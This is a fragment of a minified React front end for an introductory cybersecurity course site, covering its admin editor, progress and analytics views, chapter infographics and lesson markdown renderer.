Down",children:s.jsx(rh,{size:16})}),s.jsx("button",{className:"icon-btn edit",onClick:()=>ui(o),title:"Edit",children:s.jsx(cn,{size:16})}),s.jsx("button",{className:"icon-btn add",onClick:()=>si(o.id),title:"Add Lesson",children:s.jsx(gh,{size:16})}),s.jsx("button",{className:"icon-btn delete",onClick:()=>Fa(o),title:"Delete",children:s.jsx(un,{size:16})})]})]}),Q[o.id]&&s.jsxs("div",{className:"admin-lessons-list",children:[o.lessons.map((S,E)=>{const M=ve.includes(S.id),V=Ja(S.content),F=xe.has(S.id);return s.jsxs("div",{className:`admin-lesson-item ${S._modified?"modified":""} ${F?"selected":""}`,children:[aa&&s.jsx("button",{className:"bulk-checkbox",onClick:()=>_s(S.id),children:F?s.jsx(vh,{size:18}):s.jsx(Gy,{size:18})}),s.jsxs("div",{className:"admin-lesson-info",onClick:()=>Ge(S),children:[M?s.jsx(ta,{size:16,className:"icon-complete"}):s.jsx(ni,{size:16}),s.jsxs("span",{className:"admin-lesson-title",children:[S.title,S._modified&&s.jsx("span",{className:"badge-inline modified",children:"Modified"})]})]}),s.jsxs("div",{className:"admin-lesson-meta",children:[s.jsx("span",{className:"meta-id",children:S.id}),s.jsx("span",{className:"meta-duration",children:S.duration}),s.jsxs("span",{className:`meta-words ${V.wordCount<200?"warning":""}`,children:[V.wordCount,"w"]})]}),s.jsxs("div",{className:"admin-lesson-actions",children:[s.jsx("button",{className:"icon-btn",onClick:()=>di(S.id,o.id,"up"),disabled:E===0,title:"Move Up",children:s.jsx(dh,{size:14})}),s.jsx("button",{className:"icon-btn",onClick:()=>di(S.id,o.id,"down"),disabled:E===o.lessons.length-1,title:"Move Down",children:s.jsx(rh,{size:14})}),s.jsx("button",{className:"icon-btn edit",onClick:()=>dn(S,o.id),title:"Edit",children:s.jsx(cn,{size:14})}),s.jsx("button",{className:"icon-btn delete",onClick:()=>yt(S,o.id),title:"Delete",children:s.jsx(un,{size:14})})]})]},S.id)}),o.lessons.length===0&&s.jsxs("div",{className:"admin-empty-lessons",children:["No lessons yet. ",s.jsx("button",{onClick:()=>si(o.id),children:"Add one"})]})]})]},o.id))})]}),j==="content"&&s.jsxs("div",{className:"admin-content-manager",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(Es,{size:20}),s.jsx("span",{children:"Content Browser"})]}),s.jsxs("div",{className:"admin-search-bar",children:[s.jsxs("div",{className:"search-input-wrapper",children:[s.jsx(Pu,{size:18}),s.jsx("input",{type:"text",placeholder:"Search lessons...",value:z,onChange:o=>L(o.target.value),className:"search-input"})]}),s.jsxs("select",{value:P,onChange:o=>ie(o.target.value),className:"sort-select",children:[s.jsx("option",{value:"order",children:"Sort: Chapter Order"}),s.jsx("option",{value:"words",children:"Sort: Word Count"}),s.jsx("option",{value:"duration",children:"Sort: Duration"})]})]}),s.jsxs("div",{className:"admin-content-split",children:[s.jsxs("div",{className:"admin-lesson-list-panel",children:[gl.map(o=>{const N=Ja(o.content),S=ve.includes(o.id);return s.jsxs("div",{className:`admin-content-item ${se?.id===o.id?"selected":""}`,onClick:()=>Ge(o),children:[s.jsxs("div",{className:"admin-content-item-header",children:[S?s.jsx(ta,{size:16,className:"icon-complete"}):s.jsx(ni,{size:16}),s.jsx("span",{className:"admin-content-item-title",children:o.title})]}),s.jsxs("div",{className:"admin-content-item-meta",children:[s.jsxs("span",{children:["Ch ",o.chapterId]}),s.jsx("span",{children:o.duration}),s.jsxs("span",{className:N.wordCount<200?"warning":"",children:[N.wordCount," words"]})]})]},o.id)}),gl.length===0&&s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(Pu,{size:48}),s.jsx("p",{children:"No lessons found"})]})]}),s.jsx("div",{className:"admin-lesson-detail-panel",children:se?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-detail-header",children:[s.jsx("h2",{children:se.title}),s.jsxs("div",{className:"admin-detail-actions",children:[s.jsxs("button",{className:"icon-btn edit",onClick:()=>dn(se,se.chapterId),children:[s.jsx(cn,{size:16})," Edit"]}),s.jsxs("button",{className:"icon-btn",onClick:hn,children:[s.jsx($u,{size:16})," Copy"]})]})]}),s.jsxs("div",{className:"admin-detail-meta",children:[s.jsxs("span",{children:[s.jsx("strong",{children:"ID:"})," ",se.id]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Duration:"})," ",se.duration]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Words:"})," ",Ja(se.content).wordCount]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Code Blocks:"})," ",Ja(se.content).codeBlocks]})]}),s.jsx("div",{className:"admin-detail-content",children:Cl(se.content)})]}):s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(mh,{size:48}),s.jsx("p",{children:"Select a lesson to view details"})]})})]})]}),j==="progress"&&s.jsxs("div",{className:"admin-progress-tracker",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(bh,{size:20}),s.jsx("span",{children:"Student Progress Tracker"})]}),s.jsx("div",{className:"admin-overall-progress",children:s.jsxs("div",{className:"admin-progress-circle",children:[s.jsxs("svg",{viewBox:"0 0 100 100",children:[s.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"rgba(239, 68, 68, 0.2)",strokeWidth:"8"}),s.jsx("circle",{cx:"50",cy:"50",r:"45",fill:"none",stroke:"#ef4444",strokeWidth:"8",strokeDasharray:`${ee.completionPercent*2.83} 283`,strokeLinecap:"round",transform:"rotate(-90 50 50)"})]}),s.jsxs("div",{className:"admin-progress-circle-text",children:[s.jsxs("span",{className:"percent",children:[ee.completionPercent,"%"]}),s.jsx("span",{className:"label",children:"Complete"})]})]})}),s.jsxs("div",{className:"admin-chapter-progress",children:[s.jsx("h4",{children:"Progress by Chapter"}),ee.chapterProgress.map(o=>s.jsxs("div",{className:"admin-chapter-progress-item",children:[s.jsxs("div",{className:"admin-chapter-progress-header",children:[s.jsxs("span",{className:"chapter-name",children:["Ch ",o.id,": ",o.title]}),s.jsxs("span",{className:"chapter-stats",children:[o.completed,"/",o.total]})]}),s.jsx("div",{className:"admin-chapter-progress-bar",children:s.jsx("div",{className:"admin-chapter-progress-fill",style:{width:`${o.percent}%`}})})]},o.id))]}),s.jsxs("div",{className:"admin-completed-lessons",children:[s.jsxs("h4",{children:["Completed Lessons (",ve.length,")"]}),s.jsx("div",{className:"admin-completed-list",children:ve.length===0?s.jsx("div",{className:"admin-empty-state",children:"No lessons completed yet"}):ve.map(o=>{const N=Xe.chapters.flatMap(S=>S.lessons).find(S=>S.id===o);return N?s.jsxs("div",{className:"admin-completed-item",children:[s.jsx(ta,{size:14}),s.jsx("span",{children:N.title})]},o):null})})]}),s.jsxs("div",{className:"admin-progress-actions",children:[s.jsxs("button",{className:"admin-action-btn export",onClick:Ia,children:[s.jsx(hh,{size:18}),"Export Progress"]}),s.jsxs("button",{className:"admin-action-btn reset",onClick:fn,children:[s.jsx(un,{size:18}),"Reset Progress"]})]})]}),j==="analytics"&&s.jsxs("div",{className:"admin-analytics",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(fh,{size:20}),s.jsx("span",{children:"Course Analytics"})]}),s.jsxs("div",{className:"admin-analytics-grid",children:[s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(yh,{size:20}),s.jsx("span",{children:"Word Count"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalWordCount.toLocaleString()}),s.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",ee.avgWordCount," per lesson"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(Fu,{size:20}),s.jsx("span",{children:"Code Blocks"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalCodeBlocks}),s.jsxs("div",{className:"admin-analytics-card-sub",children:["Avg: ",(ee.totalCodeBlocks/ee.totalLessons).toFixed(1)," per lesson"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(ws,{size:20}),s.jsx("span",{children:"Pro Tips"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalTips}),s.jsxs("div",{className:"admin-analytics-card-sub",children:[ee.noTipLessons.length," lessons without tips"]})]}),s.jsxs("div",{className:"admin-analytics-card",children:[s.jsxs("div",{className:"admin-analytics-card-header",children:[s.jsx(on,{size:20}),s.jsx("span",{children:"Warnings"})]}),s.jsx("div",{className:"admin-analytics-card-value",children:ee.totalWarnings}),s.jsx("div",{className:"admin-analytics-card-sub",children:"Security & safety notes"})]})]}),s.jsxs("div",{className:"admin-quality-breakdown",children:[s.jsx("h4",{children:"Content Quality Indicators"}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with Code Examples"}),s.jsxs("span",{children:[ee.totalLessons-ee.noCodeLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.noCodeLessons.length)/ee.totalLessons*100}%`}})})]}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with Pro Tips"}),s.jsxs("span",{children:[ee.totalLessons-ee.noTipLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.noTipLessons.length)/ee.totalLessons*100}%`}})})]}),s.jsxs("div",{className:"admin-quality-item",children:[s.jsxs("div",{className:"admin-quality-label",children:[s.jsx("span",{children:"Lessons with >200 Words"}),s.jsxs("span",{children:[ee.totalLessons-ee.shortLessons.length,"/",ee.totalLessons]})]}),s.jsx("div",{className:"admin-quality-bar",children:s.jsx("div",{className:"admin-quality-fill good",style:{width:`${(ee.totalLessons-ee.shortLessons.length)/ee.totalLessons*100}%`}})})]})]}),s.jsxs("div",{className:"admin-lesson-stats-table",children:[s.jsx("h4",{children:"Detailed Lesson Statistics"}),s.jsx("div",{className:"admin-table-container",children:s.jsxs("table",{children:[s.jsx("thead",{children:s.jsxs("tr",{children:[s.jsx("th",{children:"Lesson"}),s.jsx("th",{children:"Words"}),s.jsx("th",{children:"Code"}),s.jsx("th",{children:"Tips"}),s.jsx("th",{children:"Warn"})]})}),s.jsx("tbody",{children:ee.lessonStats.map(o=>s.jsxs("tr",{className:o.wordCount<200?"warning-row":"",children:[s.jsx("td",{children:o.title}),s.jsx("td",{children:o.wordCount}),s.jsx("td",{children:o.codeBlocks}),s.jsx("td",{children:o.tips}),s.jsx("td",{children:o.warnings})]},o.id))})]})})]})]}),j==="editor"&&s.jsxs("div",{className:"admin-editor",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(cn,{size:20}),s.jsx("span",{children:De?"Edit Lesson":"Content Editor"})]}),De?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"editor-header",children:[s.jsxs("div",{className:"editor-form-row",children:[s.jsxs("div",{className:"form-group flex-1",children:[s.jsx("label",{children:"Title"}),s.jsx("input",{type:"text",value:d.title,onChange:o=>T({...d,title:o.target.value}),className:"form-input"})]}),s.jsxs("div",{className:"form-group",children:[s.jsx("label",{children:"Duration"}),s.jsx("input",{type:"text",value:d.duration,onChange:o=>T({...d,duration:o.target.value}),className:"form-input",style:{width:"120px"}})]})]}),s.jsxs("div",{className:"editor-actions",children:[s.jsxs("button",{className:`toggle-btn ${re?"active":""}`,onClick:()=>at(!re),children:[re?s.jsx(dy,{size:16}):s.jsx(Iu,{size:16}),re?"Hide Preview":"Live Preview"]}),s.jsxs("button",{className:"copy-btn",onClick:hn,children:[s.jsx($u,{size:16})," Copy"]}),s.jsx("button",{className:"cancel-btn",onClick:()=>{We(null),T({id:"",title:"",duration:"",content:"",chapterId:""})},children:"Cancel"}),s.jsxs("button",{className:"save-btn",onClick:oi,children:[s.jsx(Ch,{size:16})," Save Changes"]})]})]}),s.jsxs("div",{className:`editor-container ${re?"split":""}`,children:[s.jsxs("div",{className:"editor-textarea-wrapper",children:[s.jsxs("div",{className:"editor-textarea-header",children:[s.jsx(Fu,{size:16})," Markdown Content"]}),s.jsx("textarea",{value:d.content,onChange:o=>T({...d,content:o.target.value}),className:"editor-textarea",placeholder:"Write your lesson content in markdown..."})]}),re&&s.jsxs("div",{className:"editor-preview-wrapper",children:[s.jsxs("div",{className:"editor-preview-header",children:[s.jsx(Iu,{size:16})," Live Preview"]}),s.jsxs("div",{className:"editor-preview",children:[s.jsx("h1",{children:d.title}),Cl(d.content)]})]})]})]}):s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-lesson-selector",children:[s.jsxs("select",{value:se?.id||"",onChange:o=>{const N=Xe.chapters.flatMap(S=>S.lessons.map(E=>({...E,chapterId:S.id}))).find(S=>S.id===o.target.value);Ge(N)},children:[s.jsx("option",{value:"",children:"Select a lesson to edit..."}),Xe.chapters.map(o=>s.jsx("optgroup",{label:`Chapter ${o.id}: ${o.title}`,children:o.lessons.map(N=>s.jsx("option",{value:N.id,children:N.title},N.id))},o.id))]}),se&&s.jsxs("button",{className:"edit-selected-btn",onClick:()=>dn(se,se.chapterId),children:[s.jsx(cn,{size:16})," Edit This Lesson"]})]}),se?s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"admin-view-toggle",children:[s.jsxs("button",{className:`toggle-btn ${Ve?"":"active"}`,onClick:()=>mt(!1),children:[s.jsx(Iu,{size:16}),"Rendered"]}),s.jsxs("button",{className:`toggle-btn ${Ve?"active":""}`,onClick:()=>mt(!0),children:[s.jsx(Fu,{size:16}),"Raw"]}),s.jsxs("button",{className:"copy-btn",onClick:hn,children:[s.jsx($u,{size:16}),"Copy"]})]}),s.jsxs("div",{className:"admin-lesson-meta",children:[s.jsxs("span",{children:[s.jsx("strong",{children:"ID:"})," ",se.id]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Duration:"})," ",se.duration]}),s.jsxs("span",{children:[s.jsx("strong",{children:"Words:"})," ",Ja(se.content).wordCount]})]}),s.jsx("div",{className:"admin-preview-container",children:Ve?s.jsx("pre",{className:"admin-raw-content",children:se.content}):s.jsxs("div",{className:"admin-rendered-content",children:[s.jsx("h1",{children:se.title}),Cl(se.content)]})})]}):s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(mh,{size:48}),s.jsx("p",{children:"Select a lesson to preview or edit"})]})]})]}),j==="trash"&&s.jsxs("div",{className:"admin-trash",children:[s.jsxs("div",{className:"admin-section-title",children:[s.jsx(un,{size:20}),s.jsxs("span",{children:["Trash (",O.chapters.length+O.lessons.length," items)"]}),(O.chapters.length>0||O.lessons.length>0)&&s.jsx("button",{className:"empty-trash-btn",onClick:Ds,children:"Empty Trash"})]}),O.chapters.length===0&&O.lessons.length===0?s.jsxs("div",{className:"admin-empty-state",children:[s.jsx(Fp,{size:48}),s.jsx("p",{children:"Trash is empty"})]}):s.jsxs(s.Fragment,{children:[O.chapters.length>0&&s.jsxs("div",{className:"trash-section",children:[s.jsx("h4",{children:"Deleted Chapters"}),O.chapters.map(o=>s.jsxs("div",{className:"trash-item",children:[s.jsxs("div",{className:"trash-item-info",children:[s.jsx(Es,{size:18}),s.jsxs("div",{children:[s.jsxs("span",{className:"trash-item-title",children:["Chapter ",o.id,": ",o.title]}),s.jsxs("span",{className:"trash-item-meta",children:[o.lessons?.length||0," lessons • Deleted ",new Date(o.deletedAt).toLocaleDateString()]})]})]}),s.jsxs("button",{className:"restore-btn",onClick:()=>Ft(o),children:[s.jsx(Sh,{size:16})," Restore"]})]},o.id))]}),O.lessons.length>0&&s.jsxs("div",{className:"trash-section",children:[s.jsx("h4",{children:"Deleted Lessons"}),O.lessons.map(o=>s.jsxs("div",{className:"trash-item",children:[s.jsxs("div",{className:"trash-item-info",children:[s.jsx(ni,{size:18}),s.jsxs("div",{children:[s.jsx("span",{className:"trash-item-title",children:o.title}),s.jsxs("span",{className:"trash-item-meta",children:["From Chapter ",o.chapterId," • Deleted ",new Date(o.deletedAt).toLocaleDateString()]})]})]}),s.jsxs("button",{className:"restore-btn",onClick:()=>gt(o),children:[s.jsx(Sh,{size:16})," Restore"]})]},o.id))]})]})]})]})]})]})}const Th={1:{src:"/infographics/ch1-what-is-cybersecurity.jpg",alt:"What is Cybersecurity - CIA Triad & Internet Basics"},2:{src:"/infographics/ch2-passwords-authentication.jpg",alt:"Passwords & Authentication - Cracking, Rainbow Tables, 2FA"},3:{src:"/infographics/ch3-social-engineering.jpg",alt:"Social Engineering - Phishing, Vishing, Baiting, Pretexting"},4:{src:"/infographics/ch4-encryption-cryptography.jpg",alt:"Encryption & Cryptography - Symmetric, Asymmetric, HTTPS, Hashing"},5:{src:"/infographics/ch5-network-security.jpg",alt:"Network Security - Scanning, Firewalls, IDS/IPS"},6:{src:"/infographics/ch6-web-vulnerabilities.jpg",alt:"Web Vulnerabilities - SQL Injection, XSS, CSRF"},7:{src:"/infographics/ch7-ethical-hacking-tools.jpg",alt:"Ethical Hacking Toolkit - Nmap, Metasploit, Burp Suite"},8:{src:"/infographics/ch8-capture-the-flag.jpg",alt:"Capture The Flag - CTF Categories & Platforms"}};function ag(){const[w,B]=$.useState(!1),[X,m]=$.useState("home"),[H,J]=$.useState(null),[ce,Me]=$.useState([]),[q,j]=$.useState(!1),[ue,Q]=$.useState(0),Ne=$.useRef(null);$.useEffect(()=>{const O=localStorage.getItem("cybersecurity-progress");O&&Me(JSON.parse(O)),window.location.hash==="#admin"&&j(!0)},[]),$.useEffect(()=>{localStorage.setItem("cybersecurity-last-accessed",Date.now().toString())},[X,H]);const se=()=>{Q(O=>O+1),Ne.current&&clearTimeout(Ne.current),Ne.current=setTimeout(()=>{Q(0)},2e3),ue>=4&&(j(!0),Q(0))},Ge=O=>{const R=[...ce,O];Me(R),localStorage.setItem("cybersecurity-progress",JSON.stringify(R))},Ve=Qt.chapters.reduce((O,R)=>O+R.lessons.length,0),mt=Math.round(ce.length/Ve*100),ve=O=>{J(O),m("lesson"),B(!1),window.scrollTo(0,0)},st=()=>{if(!H)return null;for(let O=0;O<Qt.chapters.length;O++){const R=Qt.chapters[O];for(let D=0;D<R.lessons.length;D++)if(R.lessons[D].id===H.id){if(D<R.lessons.length-1)return R.lessons[D+1];if(O<Qt.chapters.length-1)return Qt.chapters[O+1].lessons[0]}}return null},G=()=>{if(!H)return null;for(let O=0;O<Qt.chapters.length;O++){const R=Qt.chapters[O];for(let D=0;D<R.lessons.length;D++)if(R.lessons[D].id===H.id){if(D>0)return R.lessons[D-1];if(O>0){const _=Qt.chapters[O-1];return _.lessons[_.lessons.length-1]}}}return null},tt=O=>{const R=O.trim().split(`
`),D=[];let _=0,Ze=!1,_e=[],dt="";for(;_<R.length;){const ye=R[_];if(ye.startsWith("```")){Ze?(D.push(s.jsxs("div",{className:"code-block",children:[s.jsxs("div",{className:"code-header",children:[s.jsx("span",{className:"code-language",children:dt}),s.jsx("button",{className:"code-copy",onClick:()=>navigator.clipboard.writeText(_e.join(`
`)),children:"Copy"})]}),s.jsx("div",{className:"code-content",children:s.jsx("pre",{children:_e.join(`
`)})})]},`code-${_}`)),Ze=!1):(Ze=!0,dt=ye.slice(3).trim()||"text",_e=[]),_++;continue}if(Ze){_e.push(ye),_++;continue}if(ye.includes("<tip>")){let De=[];for(_++;_<R.length&&!R[_].includes("</tip>");)De.push(R[_]),_++;D.push(s.jsxs("div",{className:"tip-box",children:[s.jsxs("div",{className:"tip-box-header",children:[s.jsx(ws,{size:18}),s.jsx("span",{children:"Pro Tip"})]}),s.jsx("p",{children:De.join(" ").replace("💡 ","")})]},`tip-${_}`)),_++;continue}if(ye.includes("<warning>")){let De=[];for(_++;_<R.length&&!R[_].includes("</warning>");)De.push(R[_]),_++;D.push(s.jsxs("div",{className:"warning-box",children:[s.jsxs("div",{className:"warning-box-header",children:[s.jsx(on,{size:18}),s.jsx("span",{children:"Warning"})]}),s.jsx("p",{children:De.join(" ").replace("⚠️ ","")})]},`warn-${_}`)),_++;continue}if(ye.startsWith("## ")){D.push(s.jsx("h2",{children:ye.slice(3)},`h2-${_}`)),_++;continue}if(ye.startsWith("### ")){D.push(s.jsx("h3",{children:ye.slice(4)},`h3-${_}`)),_++;continue}if(ye.includes("|")&&R[_+1]?.includes("---")){const De=ye.split("|").filter(Ce=>Ce.trim()).map(Ce=>Ce.trim());_+=2;const We=[];for(;_<R.length&&R[_].includes("|");)We.push(R[_].split("|").filter(Ce=>Ce.trim()).map(Ce=>Ce.trim())),_++;D.push(s.jsx("div",{style:{overflowX:"auto",margin:"20px 0"},children:s.jsxs("table",{style:{width:"100%",borderCollapse:"collapse",background:"var(--bg-card)",borderRadius:"12px",overflow:"hidden"},children:[s.jsx("thead",{children:s.jsx("tr",{children:De.map((Ce,b)=>s.jsx("th",{style:{padding:"12px 16px",textAlign:"left",borderBottom:"1px solid var(--border-color)",color:"var(--accent-red)"},children:Ce},b))})}),s.jsx("tbody",{children:We.map((Ce,b)=>s.jsx("tr",{children:Ce.map((k,Z)=>s.jsx("td",{style:{padding:"12px 16px",borderBottom:"1px solid var(--border-color)",color:"var(--text-secondary)"},children:s.jsx("span",{dangerouslySetInnerHTML:{__html:k.replace(/\*\*(.*?)\*\*/g,'<strong style="color:var(--text-primary)">$1</strong>').replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-size:13px">$1</code>')}})},Z))},b))})]})},`table-${_}`));continue}if(ye.startsWith("- ")||ye.startsWith("* ")){const De=[];for(;_<R.length&&(R[_].startsWith("- ")||R[_].startsWith("* "));)De.push(R[_].slice(2)),_++;D.push(s.jsx("ul",{children:De.map((We,Ce)=>s.jsx("li",{dangerouslySetInnerHTML:{__html:We.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},Ce))},`ul-${_}`));continue}if(/^\d+\. /.test(ye)){const De=[];for(;_<R.length&&/^\d+\. /.test(R[_]);)De.push(R[_].replace(/^\d+\. /,"")),_++;D.push(s.jsx("ol",{children:De.map((We,Ce)=>s.jsx("li",{dangerouslySetInnerHTML:{__html:We.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px">$1</code>')}},Ce))},`ol-${_}`));continue}ye.trim()&&D.push(s.jsx("p",{dangerouslySetInnerHTML:{__html:ye.replace(/\*\*(.*?)\*\*/g,"<strong>$1</strong>").replace(/`(.*?)`/g,'<code style="background:rgba(239,68,68,0.1);padding:2px 6px;border-radius:4px;font-family:JetBrains Mono,monospace;font-size:14px">$1</code>').replace(/\[(.*?)\]\((.*?)\)/g,'<a href="$2" target="_blank" style="color:var(--accent-cyan)">$1</a>')}},`p-${_}`)),_++}return D};return s.jsxs("div",{className:"app-container",children:[s.jsx("div",{className:"bg-grid"}),s.jsx("div",{className:"bg-noise"}),s.jsx("div",{className:"gradient-orb orb-red"}),s.jsx("div",{className:"gradient-orb orb-cyan"}),s.jsx("div",{className:"gradient-orb orb-purple"}),s.jsx("button",{className:"mobile-menu-btn",onClick:()=>B(!w),children:w?s.jsx(zs,{size:24}):s.jsx(wy,{size:24})}),s.jsx("div",{className:`sidebar-overlay ${w?"open":""}`,onClick:()=>B(!1)}),s.jsxs("aside",{className:`sidebar ${w?"open":""}`,children:[s.jsxs("div",{className:"sidebar-header",onClick:se,style:{cursor:"pointer"},children:[s.jsx("div",{className:"sidebar-logo",children:s.jsx(Os,{size:24})}),s.jsx("span",{className:"sidebar-title",children:"Cybersecurity"})]}),s.jsxs("nav",{className:"sidebar-nav",children:[s.jsxs("div",{className:`nav-item ${X==="home"?"active":""}`,onClick:()=>{m("home"),B(!1)},children:[s.jsx(by,{size:20,className:"nav-item-icon"}),s.jsx("span",{children:"Home"})]}),Qt.chapters.map(O=>s.jsxs("div",{className:"nav-section",children:[s.jsxs("div",{className:"nav-section-title",children:["Ch ",O.id,": ",O.title]}),O.lessons.map(R=>s.jsxs("div",{className:`nav-item ${H?.id===R.id?"active":""}`,onClick:()=>ve(R),children:[ce.includes(R.id)?s.jsx(ta,{size:18,className:"nav-item-icon",style:{color:"var(--accent-green)"}}):s.jsx(ni,{size:18,className:"nav-item-icon"}),s.jsx("span",{children:R.title})]},R.id))]},O.id))]}),s.jsxs("div",{style:{marginTop:"auto",padding:"20px",borderTop:"1px solid var(--border-color)"},children:[s.jsxs("div",{style:{display:"flex",justifyContent:"space-between",marginBottom:"8px",fontSize:"14px",color:"var(--text-secondary)"},children:[s.jsx("span",{children:"Progress"}),s.jsxs("span",{children:[mt,"%"]})]}),s.jsx("div",{className:"progress-bar",children:s.jsx("div",{className:"progress-fill",style:{width:`${mt}%`}})})]})]}),s.jsxs("main",{className:"main-content",children:[X==="home"&&s.jsxs(s.Fragment,{children:[s.jsxs("div",{className:"hero",children:[s.jsxs("div",{className:"hero-badge",children:[s.jsx(Os,{size:16}),s.jsx("span",{children:"Cybersecurity Course"})]}),s.jsxs("h1",{className:"hero-title",children:["Learn",s.jsx("br",{}),s.jsx("span",{children:"Cybersecurity"})]}),s.jsx("p",{className:"hero-subtitle",children:"Understand how hackers think, protect yourself online, and start your ethical hacking journey. No experience required!"}),s.jsxs("button",{className:"nav-button primary",onClick:()=>ve(Qt.chapters[0].lessons[0]),style:{margin:"0 auto"},children:[s.jsx(My,{size:20}),"Start Learning"]})]}),s.jsxs("div",{style:{marginBottom:"48px"},children:[s.jsx("h2",{style:{fontSize:"28px",fontWeight:"700",marginBottom:"24px"},children:"Course Chapters"}),Qt.chapters.map(O=>{const R=O.lessons.filter(_=>ce.includes(_.id)).length,D=Th[O.id];return s.jsxs("div",{className:"chapter-card",onClick:()=>ve(O.lessons[0]),style:{flexDirection:"column",padding:0,overflow:"hidden"},children:[D&&s.jsxs("div",{style:{width:"100%",height:"160px",overflow:"hidden",position:"relative"},children:[s.jsx("img",{src:`/cybersecurity-learning/${D.src.slice(1)}`,alt:D.alt,loading:"lazy",style:{width:"100%",height:"100%",objectFit:"cover",objectPosition:"center",transition:"transform 0.3s ease"}}),s.jsx("div",{style:{position:"absolute",bottom:0,left:0,right:0,height:"40px",background:"linear-gradient(transparent, var(--bg-card))"}})]}),s.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"16px",padding:"16px 20px",width:"100%"},children:[s.jsx("div",{className:"chapter-number",children:O.id}),s.jsxs("div",{className:"chapter-info",children:[s.jsx("div",{className:"chapter-title",children:O.title}),s.jsxs("div",{className:"chapter-meta",children:[O.description," • ",O.lessons.length," lessons",R>0&&s.jsxs("span",{style:{color:"var(--accent-green)",marginLeft:"8px"},children:["(",R,"/",O.lessons.length," complete)"]})]})]}),s.jsx(ii,{size:24,style:{color:"var(--text-muted)"}})]})]},O.id)})]}),s.jsxs("div",{className:"glass-card",style:{textAlign:"center"},children:[s.jsx("h3",{style:{marginBottom:"16px",fontSize:"20px"},children:"What You'll Learn"}),s.jsx("p",{style:{color:"var(--text-secondary)",marginBottom:"24px"},children:"By the end, you'll understand how real attacks work and how to defend against them:"}),s.jsx("div",{style:{display:"grid",gridTemplateColumns:"repeat(auto-fit, minmax(150px, 1fr))",gap:"16px"},children:["Password Security","Phishing Defense","Encryption","Network Scanning","Web Hacking","CTF Challenges"].map(O=>s.jsxs("div",{style:{padding:"16px",background:"rgba(239, 68, 68, 0.1)",borderRadius:"12px",border:"1px solid rgba(239, 68, 68, 0.2)"},children:[s.jsx(ta,{size:24,style:{color:"var(--accent-red)",marginBottom:"8px"}}),s.jsx("div",{style:{fontWeight:"500"},children:O})]},O))})]})]}),X==="lesson"&&H&&s.jsxs("div",{className:"lesson-container",children:[s.jsxs("div",{className:"lesson-header",children:[s.jsxs("div",{className:"lesson-breadcrumb",children:[s.jsx("a",{href:"#",onClick:O=>{O.preventDefault(),m("home")},children:"Home"}),s.jsx(ii,{size:16}),s.jsx("span",{children:H.title})]}),s.jsx("h1",{className:"lesson-title",children:H.title}),s.jsxs("div",{className:"lesson-meta",children:[s.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[s.jsx(io,{size:16}),H.duration]}),ce.includes(H.id)&&s.jsxs("span",{style:{display:"flex",alignItems:"center",gap:"6px",color:"var(--accent-green)"},children:[s.jsx(ta,{size:16}),"Completed"]})]})]}),(()=>{const O=parseInt(H.id),R=Th[O];return R?s.jsxs("div",{className:"infographic-container",children:[s.jsxs("div",{className:"infographic-badge",children:[s.jsx(Ty,{size:14}),s.jsxs("span",{children:["Chapter ",O," Infographic"]})]}),s.jsx("img",{src:`/cybersecurity-learning/${R.src.slice(1)}`,alt:R.alt,className:"infographic-image",loading:"lazy",onClick:D=>D.target.classList.toggle("expanded")}),s.jsx("p",{className:"infographic-caption",children:"👆 Tap to expand"})]}):null})(),s.jsx("div",{className:"lesson-content",children:tt(H.content)}),!ce.includes(H.id)&&s.jsxs("button",{className:"nav-button primary",style:{width:"100%",justifyContent:"center",marginTop:"32px"},onClick:()=>Ge(H.id),children:[s.jsx(ta,{size:20}),"Mark as Complete"]}),s.jsxs("div",{className:"lesson-nav",children:[G()?s.jsxs("button",{className:"nav-button",onClick:()=>ve(G()),children:[s.jsx(ii,{size:20,style:{transform:"rotate(180deg)"}}),"Previous"]}):s.jsx("div",{}),st()?s.jsxs("button",{className:"nav-button primary",onClick:()=>ve(st()),children:["Next Lesson",s.jsx(ii,{size:20})]}):s.jsxs("button",{className:"nav-button 